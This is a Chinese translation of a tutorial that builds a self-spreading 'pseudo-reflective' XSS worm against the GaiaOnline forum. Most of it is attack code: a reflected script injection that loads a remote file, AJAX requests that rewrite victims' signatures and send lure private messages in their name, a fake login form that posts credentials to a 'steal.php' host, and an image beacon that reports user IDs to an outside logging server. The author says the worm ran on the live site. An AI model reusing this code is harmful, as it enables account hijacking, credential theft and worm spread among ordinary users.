

# "Psecudo-Reflective" 蠕虫剖析

> 原文：[`www.pediy.com/kssd/pediy10/91028.html`](https://www.pediy.com/kssd/pediy10/91028.html)

\[翻译\]"Psecudo-Reflective" 蠕虫剖析  
  
作者：Kyran  
  
译者：riusksk(泉哥：http://riusksk.blogbus.com)  
  
1.前言  
  
XSS(Cross-Site Scripting )攻击主要有两种类型,一种叫永久型（persistent）,它存储在服务端,只不过需要用户访问存在漏洞的页面;另一种叫反射型（reflective）,它存在 URI 中,需要用户点击链接才能触发。永久型 XSS 漏洞被认为更为危险，但反射型 XSS 漏洞更为普遍。大部分的 javascript worm 都是使用永久型 XSS 漏洞进行攻击的。在“pseudo-reflective"蠕虫的第一版本诞生前，还没有一使用 reflective payload 编写的 XSS 蠕虫的案例记载。本文将向您展示如何通过使用 reflective payload 来编写蠕虫以达到永久性传播的目的。  
  
2.蠕虫  
  
2.1 Beginning  
  
首先需要寻找一个 XSS 漏洞，但我在 GaiaOnline.com 上面只找到一个非永久型的 XSS 漏洞。幸运的是，我找到了好几个这样的反射型漏洞。这里我们就用 www.gaiaonline.com/gaia/vend.php?sort=  这个页面，攻击方式很简单。  
  
Code:  
  
"><script></script>  
  
因此我们可以很容易地在里面添加一个 scr 属性，并远程执行它。  
  
Code:  
  
"><script src=http://subdom.site.com/js.js></script><noscript>  
  
现在需要一个非脚本标志以防止蠕虫被多次运行。我们先记住该漏洞页面，并将其赋予一变量，如果该漏洞被修补了，我们就可以很方便地更改它了。  
  
Code:  
  
sO = http://www.gaiaonline.com/gaia/vend.php?sort=  
  
现在我们只需要发送数据给其它页面，这样我们就可以代表用户执行操作了。  
  
2.2 AJAX Basics  
  
AJAX(Asynchronous Javascript And XML)是广为流传的 Web '2.0'的一个主要特色。这个站点里面有许多合法用户，我们可以适当地借用下。在不同的浏览器中，ajax 会被单独执行，我们需要先去处理它。另外，WEB 开发者总是喜欢挑剔地写些符合标准的兼容代码。  
  
Code:  
  
var xmlhttp; // Setup a variable.   
try { // This checks for alternate browsers such as Opera or Firefox   
 xmlhttp = new XMLHttpRequest();   
} catch (e) { // Oops, not one of those. Try different IE implementations.   
 var XHR = new Array('MSXML2.XMLHTTP.5.0',   
                     'MSXML2.XMLHTTP.4.0',   
                     'MSXML2.XMLHTTP.3.0',   
                     'MSXML2.XMLHTTP',   
                     'Microsoft.XMLHTTP');   
 var success = false;   
 for (var i=0;i < XHR.length && !success; i++) {   
   try {   
     xmlhttp = new ActiveXObject(XHR\[i\]);   
     success = true;   
   } catch (e) {}   
 }   
 if (!success) {   
   throw new Error('No XHR object'); // No XMLHttpRequest object? Is this 1990?   
 }   
}  
  
现在我们可以在大多数浏览器中利用变量 xmlhttp 中使用 XMLHttpRequest 对象,这样我们就可以向不同的页面发送各种请求。（只能在同域范围内执行，甚至不允许存在不同的子域名，这是浏览器的一种安全限制）那么我们现在该怎么办呢？  
  
2.3 繁殖传播  
  
通过该 XSS 漏洞传播给其它用户！但我们该如何做到呢？我们可以使用新的 xmlhttp 对象,同时需要生成一个随机数作为 user ID。  
  
Code:  
  
var prId = Math.floor(Math.random()\*699999);   
  
生成一个到 699999 为止的随机数。699999 并不是一特定值，这里只是我个人随便决定的。我们可以很容易地找到最新注册的 user ID，然后生成一个以此为峰值的随机数，以保证当前所有的用户均包括在里面。现在我们发送数据给其它页面。该站是一个论坛站点，因此允许使用 BBCode。那么在哪一页面呢？其实我们可以去为用户添加一个签名。（AJAX 通过被感染的用户来执行，同时在请求中发送 cookies。）  
  
Code:  
  
var bbUrl = "Dont click me";  
  
在 escape(")里面放入攻击向量（如"><sciprt"等）,但 URI 是用十六进制编码的(如%22%20 等）。这是因为当它发送给服务器时，就会马上被 unescaped 解密。因此 HTML 是用在 PM 中，而非与之相对应的 URI。我们使用一个正确的 URI，BBCcode 将被正确地解析到链接中，这样 worm 就可以自行传播了。现在我们将它添加到被感染用户的签名中。  
  
Code:  
  
var targetURI = "/account/signature/"; // URI to send params to   
var params = "signature=" + bbUrl; //Params to send to targetURI - In this case, changing the signature.   
xmlhttp.open("POST", targetURI, true); //Open XHR and then set headers.   
xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");   
xmlhttp.setRequestHeader("Content-length", params.length);   
xmlhttp.setRequestHeader("Connection", "close");   
xmlhttp.send(params); //Send the parameters to the target.  
  
现在我们使用 AJAX 技术向其它页面发送请求，冒充用户来更改他们的签名。接下来我们可以继续做同样的操作，比如站内消息（PMing）发送这份 BBcode 去连接 reflective payload，或者用它为其它用户添加评论。  
  
2.4 社会工程  
  
该蠕虫现在发送 BBCocde 到被感染用户的签名上,但我们在传播它的同时,如何去确保链接被点击了呢?我们可以通过站内消息(Private Messages)来发送链接,但在我首次发布本蠕虫时,发现有些用户已经注意到了此类信息了。由于有很多相同的标题与内容，导致“噪音”太多，漏洞很快被修补，因此我们必须确保自己的信息与众不同。  
  
Code:  
  
function gQ() {   
rN=Math.floor(Math.random()\*10);   
var quote=new Array(10)   
  quote\[0\]="Free avi art at my shop...";   
  quote\[1\]="Don't click me :ninja:";      
  quote\[2\]="Rate my avi in this contest!";   
  quote\[3\]="Read my Journal!!";   
  quote\[4\]="Did you see this!?";   
  quote\[5\]="Whoa...";   
  quote\[6\]="Come check this out";   
  quote\[7\]="You should go here..";   
  quote\[8\]="Go check this out plx ;)";   
  quote\[9\]="Click this.";   
  
  return rM = quote\[rN\];   
}  
  
当我们调用 gQ()函数时，将会返回一个半随机（semi-random）quote。后面我将创建一个与之类似的函数 gS()，用以发送不同标题的 PMS。  
  
还记得我们之前 escape 加密的攻击向量中的 bbUrl 变量吗?这里我们用 gQ()函数来替换"Dont click me",这会使\[url\]代码间的内容更为与众不同,假如之前已经接到此类信息,就会认为是不同的消息.我们可以调用 bbUrl2 来发送像下面的 PM.  
  
Code:   
function pmSend() {   
  xmlhttp.abort();   
  var targetURI = "/profile/privmsg.php";   
  var params = "mode=post&username=" + prId + "&subject=" + gS() + "&folder=inbox&post=true&message=" + bbUrl2;   
  xmlhttp.open("POST", targetURI, true);   
  xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");   
  xmlhttp.setRequestHeader("Content-length", params.length);   
  xmlhttp.setRequestHeader("Connection", "close");   
  xmlhttp.send(params);   
}   
setTimeout("pmSend()",500);   
  
其中的时间延迟主要是为了确保页面加载和其他 AJAX 请求能够完成。注意一下变量'params'，我们创建了用来生成消息标题的的 gS()函数。  
  
现在我们重写页面中的部分内容，这部分确实很基础。利用一些 HTML 代码可以构造出一份 login form 副本，然后替代 form 中的'action'属性值，重新定位到你的 log script，然后放入某变量，就像下面的代码一样。  
  
Code:  
  
var nF = '<form etc>';   
document.getElementById("sidebar").innerHTML=nF;  
  
这种方法去掉了伪造的登陆页面中的 div 标记，然后用一个错误页面或者其它的登陆页面来代替 div。  
  
Code:  
  
var nF = '<h1>Error!</h1>';   
document.getElementById("content").innerHTML=nF;  
  
现在我们的蠕虫已经相当完善了，但我们如何跟踪所有的这些数据和我们所骗取的信息呢？  
  
2.5 Logging  
  
  
我们该如何判断哪个用户当前正运行着蠕虫呢？我们可以先查找对方的用户 ID。幸运的是，GaiaOnline 将 useid 都放在退出链接中。可能有种方法可以防止 CSRF。     
  
    Code:   
var dC = document.body.innerHTML   
var start = dC.indexOf("userid=");   
var end = dC.indexOf('"',start);   
var token = dC.slice(start,end);   
                                    
  
这部分需要花会时间。我们可以先将整个页面链接放入一变量中，然后使用 indexOf 查找它的首个字符出现的位置。我们知道 useid= 后面是一加引号的数字，因此也可以使用 indexOf 来保存它。现在我们先提取前后 start 与 end 两点间的数值，然后赋予变量'token'，最后这就是正运行脚本的用户的 ID 了。接着我们可以创建一个 image 来指向 logging script,并结合之前其他用户 ID 生成的'prID'变量以及刚在变量'token'中找到的值，以此来构造链接地址。  
  
      Code:   
i = new Image()   
i.src = "http://subdom.site.com/i.php?i=To-" + prId + "|Sent from-" + token;   
document.appendChild(i);   
                                                       
  
现代浏览器中，GET 请求是发送到 image 元素的 location，然后通过脚本来传输我们的数据。我们也可以验证用户是否使用了正确的证书，这只需先在伪造的钓鱼登陆页面中发送'token'即可。  
  
Code:   
var nF = '<form action="http://subdom.site.com/steal.php"><input type="text" name="username" value=""><input type="hidden" name="uid" value="' + token + '"></form>'   
  
  
通过遍历 steal.php 中的日志，我们就可以查看 uid 与用户名是否匹配，这通过修改地址就可实现，例如…       
  
            Code:   
http://www.gaiaonline.com/forum/search.php?action=userposthistory&search\_author=\[Put the uid here\]   
                                                          
  
3.结论          
  
   经过这一切之后，我们可以把它们结合起来，弄成一个像 http://mihd.net/52hp8d （译注：链接已失效）这样的蠕虫病毒。 我建议你使用 Notepad++ 或者其它支持语法高亮的文本编辑器(译注：本人习惯用 EditPlus)来阅读它。由于蠕虫需要与用户交互，这可能就是它无法持续快速传播的一个原因，但它很容易再次暴发，因为正如上面所说的，反射型跨站脚本漏洞更为常见，这就可以引发了更多的此类攻击。    
  
3.1 注意事项  
  
   该蠕虫可能并没有什么标志性的特征。 Kuza55 建议我使用反向跨站请求（RCSR）漏洞去攻击存在此漏洞的 Firefox password manager ，但它也不能像一些 CSRF 攻击那样，可以更改用户名，电子邮件或其他帐户信息。  
  
在本文中提到的这个漏洞在 GaiaOnline 论坛上已被公开有段时间了，当时该蠕虫还尚未被提及。由于它似乎没办法在短时间内修补，以致给了我充分的时间来“玩”它。虽然，这并不代表着 GaiaOnline 在很多地方都特别的“不安全”，但也并不代表它不存在。  
  
大约 70 ~80 ％的网站都收到 DarkReading 的跨站脚本漏洞提示信息：  
  
http://www.darkreading.com/document.asp?doc\_id=111482   
  
甚至在一些标榜着“安全”的第三方安全公司也存在这类漏洞，如下面的文章所述：  
  
http://www.darkreading.com/document.asp?doc\_id=110363   
http://www.darkreading.com/document.asp?doc\_id=116862  
  
3.2 特别鸣谢  
  
感谢 RSnake 提供很多 sla.ckers 论坛上的重要资源（ http://sla.ckers.org/forum ）以及 XSS Cheat Sheet. (http://ha.ckers.org/xss.html)。同时他也给我提了些关于蠕虫方面的意见，帮我整理代码（虽然，到最后还是重写了其中的大部分代码，呵呵）。  
  
感谢 Kuza55 （ http://kuza55.blogspot.com/ ）为我提供了很多关于 logging 的重要思路。  
  
感谢 Sid/WhiteAcid(http://www.whiteacid.org/ and http://blogs.securiteam.com/index.php/archives/author/whiteacid/)建议我在 logging 中的使用 date()。